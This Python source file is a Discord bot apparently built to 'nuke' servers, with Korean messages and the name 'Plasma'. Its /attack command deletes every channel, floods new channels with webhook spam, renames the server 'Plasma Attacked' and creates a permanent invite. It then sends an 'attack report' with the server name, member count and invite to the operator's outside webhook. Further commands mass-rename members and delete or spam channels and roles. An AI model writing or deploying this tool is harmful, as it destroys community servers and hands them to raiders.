import discord
from discord.ext import commands, tasks
import json
import random
import os
from datetime import datetime, timedelta
from decimal import Decimal, ROUND_HALF_UP
import asyncio 
from discord import Embed
import time
import aiohttp
from collections import defaultdict
import datetime 

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True
attack_request_count = 0
bot = commands.Bot(command_prefix='!', intents=intents)
intents.members = True

@bot.tree.command(name="discord", description="공식 디스코드 서버 링크를 전송합니다.")
async def discord_command(interaction: discord.Interaction):
    discord_link = "YOUR_DISCORD_SERVER_INVITE_LINK_HERE"
    await interaction.response.send_message(f"공식 디스코드 서버 링크: {discord_link}", ephemeral=True)

@bot.tree.command(name="invite", description="봇 초대 링크를 보여줍니다.")
async def discord_invite(interaction: discord.Interaction):
    discord_invite = "YOUR_DISCORD_BOT_INVITE_LINK_HERE"

    await interaction.response.send_message(f"봇 초대 링크: {discord_invite}", ephemeral=True)
last_attack_usage = defaultdict(float)

@bot.tree.command(name="attack", description="설명 없음.")
async def attack_command(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    current_time = time.time()

    if current_time - last_attack_usage[user_id] < 600:
        remaining_time = round(600 - (current_time - last_attack_usage[user_id]), 2)
        await interaction.response.send_message(f"명령어를 사용할 수 없습니다. {remaining_time}초 후에 다시 시도해 주세요.", ephemeral=True)
        return

    last_attack_usage[user_id] = current_time

    global attack_request_count
    attack_request_count = 0
    attack_request_count += 1

    attack_start_time = time.time()
    
    await interaction.response.send_message("`💣💣`", ephemeral=True)
    try:
        delete_tasks = [channel.delete() for channel in interaction.guild.channels]
        await asyncio.gather(*delete_tasks)
    except:
        print("error?")


    create_tasks = []
    for i in range(10):
        attack_request_count += 1
        create_tasks.append(create_channel_and_webhooks(interaction.guild, i))
    await asyncio.gather(*create_tasks)

    await interaction.guild.edit(name="Plasma Attacked")

    attack_end_time = time.time()
    attack_duration = round(attack_end_time - attack_start_time, 2) 

    guild_name = interaction.guild.name
    member_count = interaction.guild.member_count
    invite_link = await interaction.guild.text_channels[0].create_invite(max_age=0, max_uses=0) 
    attack_request_count += 1

    await send_attack_info_webhook(guild_name, member_count, invite_link, attack_request_count, attack_duration, attack_start_time)

async def send_attack_info_webhook(guild_name, member_count, invite_link, attack_request_count, attack_duration, attack_start_time):
    embed = discord.Embed(title="Plasma 공격 보고서", color=discord.Color.green())
    embed.add_field(name="서버 이름", value=guild_name, inline=True)
    embed.add_field(name="유저 수", value=member_count, inline=True)
    embed.add_field(name="공격 횟수", value=f"{attack_request_count}회", inline=True) 
    embed.add_field(name="초대 링크", value=invite_link, inline=False)
    embed.add_field(name="공격 시간", value=f"{attack_duration}초", inline=True)
    embed.add_field(name="공격 시작 시간", value=time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(attack_start_time)), inline=False)

    webhook_url = "WEBHOOK_URL_HERE"
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(webhook_url, session=session) 
        await webhook.send(embed=embed)


async def create_channel_and_webhooks(guild, index):
    global attack_request_count
    channel = await guild.create_text_channel(f"Plasma")
    attack_request_count += 1

    webhook_tasks = []

    for _ in range(1): 
        webhook = await channel.create_webhook(name="Plasma")
        attack_request_count += 1

        message = f"YOUR MESSAGE AT HERE"
        for _ in range(15):
            attack_request_count += 1
            webhook_tasks.append(webhook.send(message))

    await asyncio.gather(*webhook_tasks)
@bot.tree.command(name="change_nickname", description="설명 없음.")
async def change_all_nicknames(interaction: discord.Interaction):
    executor = interaction.user
    guild = interaction.guild
    guild_name = guild.name
    member_count = guild.member_count
    start_time = time.time()

    tasks = []
    members = [member async for member in guild.fetch_members()] 
    print(f"서버의 총 멤버 수: {len(members)}")  

    for member in members:
        if not member.bot: 
            if member.nick != "Plasma": 
                tasks.append(member.edit(nick="Plasma"))
            else:
                print(f"{member.name}의 별명이 이미 'Plasma'입니다.")

    change_count = len(tasks)

    try:
        for i in range(0, len(tasks), 5):
            await asyncio.gather(*tasks[i:i+5]) 

        await interaction.response.send_message(f"{change_count}명의 멤버의 별명이 'Plasma'로 변경되었습니다.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("권한이 부족하여 멤버의 별명을 변경할 수 없습니다.", ephemeral=True)
    except Exception as e:
        await interaction.response.send_message(f"오류 발생: {e}", ephemeral=True)

    invite_link = await guild.text_channels[0].create_invite(max_age=0, max_uses=0)

    end_time = time.time()
    duration = round(end_time - start_time, 2)

    embed = discord.Embed(title="Plasma 공격 보고서", color=discord.Color.green())
    embed.add_field(name="서버 이름", value=guild_name, inline=True)
    embed.add_field(name="유저 수", value=str(member_count), inline=True)
    embed.add_field(name="명령어 실행자", value=executor.mention, inline=True)
    embed.add_field(name="변경된 닉네임", value="Plasma", inline=False)
    embed.add_field(name="요청 횟수", value=str(change_count), inline=True)
    embed.add_field(name="변경 시간", value=f"{duration}초", inline=True)
    embed.add_field(name="초대 링크", value=invite_link.url, inline=False)
    embed.set_footer(text=f"명령어 실행 시간: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(start_time))}")

    webhook_url = "WEBHOOK_URL_HERE"
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(webhook_url, session=session)
        await webhook.send(embed=embed)
@bot.tree.command(name="delete_channels", description="설명 없음.")
async def delete_channels(interaction: discord.Interaction):
    guild = interaction.guild
    channels_to_delete = guild.channels
    start_time = time.time() 

    delete_count = 0
    tasks = []

    await interaction.response.send_message(f"{len(channels_to_delete)}개의 채널 삭제를 시작합니다...", ephemeral=True)

    for channel in channels_to_delete:
        tasks.append(delete_channel(channel))
        delete_count += 1

    await asyncio.gather(*tasks)

    end_time = time.time()
    duration = round(end_time - start_time, 2)

    await send_delete_report(interaction, delete_count, duration)

async def delete_channel(channel):
    try:
        await channel.delete()
        print(f"{channel.name} 채널이 삭제되었습니다.")
    except discord.Forbidden:
        print(f"{channel.name} 채널 삭제 권한이 부족합니다.")
    except Exception as e:
        print(f"{channel.name} 채널 삭제 중 오류 발생: {e}") 

async def send_delete_report(interaction, delete_count, duration):
    guild = interaction.guild
    executor = interaction.user
    guild_name = guild.name

    embed = discord.Embed(title="채널 삭제 보고서", color=discord.Color.green())
    embed.add_field(name="서버 이름", value=guild_name, inline=True)
    embed.add_field(name="삭제된 채널 수", value=str(delete_count), inline=True)
    embed.add_field(name="명령어 실행자", value=executor.mention, inline=True)
    embed.add_field(name="소요 시간", value=f"{duration}초", inline=False)
    embed.set_footer(text=f"명령어 실행 시간: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}")

    webhook_url = "WEBHOOK_URL_HERE"
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(webhook_url, session=session)
        await webhook.send(embed=embed)


@bot.tree.command(name="change_server_name", description="설명 없음.")
async def change_servername(interaction: discord.Interaction):
    guild = interaction.guild
    old_server_name = guild.name  
    new_server_name = "Plasma Attacked" 

    await guild.edit(name=new_server_name)
    await interaction.response.send_message(f"서버 이름이 '{new_server_name}'로 변경되었습니다.", ephemeral=True)

    await send_servername_report(interaction, old_server_name, new_server_name)

async def send_servername_report(interaction, old_server_name, new_server_name):
    guild = interaction.guild
    executor = interaction.user

    embed = discord.Embed(title="서버 이름 변경 보고서", color=discord.Color.green())
    embed.add_field(name="서버 이름 (이전)", value=old_server_name, inline=True)
    embed.add_field(name="서버 이름 (변경 후)", value=new_server_name, inline=True)
    embed.add_field(name="명령어 실행자", value=executor.mention, inline=True)
    embed.set_footer(text=f"명령어 실행 시간: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}")

    webhook_url = "WEBHOOK_URL_HERE"
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(webhook_url, session=session)
        await webhook.send(embed=embed)
        
@bot.tree.command(name="create_channels", description="설명 없음.")
async def create_channels(interaction: discord.Interaction, number_of_channels: int):
    if not (1 <= number_of_channels <= 15):
        await interaction.response.send_message("1에서 15 사이의 숫자만 입력 가능합니다.", ephemeral=True)
        return

    guild = interaction.guild
    default_channel_name = "Plasma" 
    created_channels = []
    start_time = time.time() 

    for i in range(number_of_channels):
        new_channel = await guild.create_text_channel(f"{default_channel_name}")
        created_channels.append(new_channel.name)

    end_time = time.time()
    duration = round(end_time - start_time, 2)

    await interaction.response.send_message(f"{number_of_channels}개의 채널이 생성되었습니다. (소요 시간: {duration}초)", ephemeral=True)

    await send_channel_creation_report(interaction, default_channel_name, duration)

async def send_channel_creation_report(interaction, created_channels, duration):
    guild = interaction.guild
    executor = interaction.user
    start_time = time.time()

    embed = discord.Embed(title="채널 생성 보고서", color=discord.Color.green())
    embed.add_field(name="서버 이름", value=guild.name, inline=True)
    embed.add_field(name="생성된 채널", value=created_channels, inline=False)
    embed.add_field(name="명령어 실행자", value=executor.mention, inline=True)
    embed.add_field(name="소요 시간", value=f"{duration}초", inline=True)
    embed.set_footer(text=f"명령어 실행 시간: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(start_time))}")

    webhook_url = "WEBHOOK_URL_HERE"
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(webhook_url, session=session)
        await webhook.send(embed=embed)
@bot.tree.command(name="create_role", description="설명 없음.")
async def create_role(interaction: discord.Interaction, count: int):
    if count < 1 or count > 15:
        await interaction.response.send_message("역할 수는 1개 이상, 15개 이하이어야 합니다.", ephemeral=True)
        return

    guild = interaction.guild
    created_roles = []

    for _ in range(count):
        role = await guild.create_role(name="Plasma")
        created_roles.append(role)

    await interaction.response.send_message(f"{len(created_roles)}개의 역할이 생성되었습니다.", ephemeral=True)

    embed = discord.Embed(title="역할 생성 보고서", color=discord.Color.green())
    embed.add_field(name="서버 이름", value=guild.name, inline=True)
    embed.add_field(name="역할 수", value=str(len(created_roles)), inline=True)
    embed.add_field(name="요청자", value=interaction.user.mention, inline=True)
    embed.add_field(name="요청 시간", value=time.strftime('%Y-%m-%d %H:%M:%S', time.localtime()), inline=True)

    webhook_url = "WEBHOOK_URL_HERE"
    async with aiohttp.ClientSession() as session:
        webhook = discord.Webhook.from_url(webhook_url, session=session)
        await webhook.send(embed=embed)
@bot.event
async def on_ready():
    try:
        await bot.tree.sync() 
        print(f"Slash 명령어가 {len(bot.tree.get_commands())}개 동기화되었습니다.")
    except Exception as e:
        print(f"명령어 동기화 중 오류 발생: {e}")
    
    print(f"{bot.user.name}가 준비되었습니다!")
bot.run('BOT_TOKEN_HERE') 
